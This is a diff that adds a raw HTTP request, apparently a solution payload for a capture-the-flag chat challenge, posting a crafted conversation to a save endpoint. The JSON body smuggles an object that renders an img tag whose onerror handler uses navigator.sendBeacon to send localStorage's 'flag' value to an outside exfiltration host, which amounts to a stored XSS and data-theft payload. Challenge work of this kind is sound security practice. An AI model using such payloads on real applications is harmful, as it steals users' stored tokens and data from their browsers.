@@ -1,0 +1,45 @@
+POST /api/chat/save HTTP/2
+Host: cff059bc-cafa-4a02-bb2b-1cf093064fc4.chatppp.chal.pwni.ng
+Content-Length: 668
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://c6264c42-ad29-4a53-a923-70d4276e7df5.chatppp.chal.pwni.ng
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://c6264c42-ad29-4a53-a923-70d4276e7df5.chatppp.chal.pwni.ng/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{
+  "conversation": {
+    "name": "name",
+    "messages": [
+      {
+        "body": "msg1",
+        "timestamp": "2025-04-05T11:41:31.537Z",
+        "origin": "user",
+        "key": "keydupa",
+        "$on:$effect:0": {
+          "kind": "native",
+          "tag": "img",
+          "props": {
+            "src": "x",
+            "onerror": "navigator.sendBeacon('https://exfil.server/', localStorage.getItem('flag'))"
+          }
+        }
+      },
+      {
+        "body": "dfdfdfdf",
+        "timestamp": "2025-04-05T11:41:31.537Z",
+        "origin": "bot",
+        "key": "keydupa"
+      }
+    ]
+  }
+}
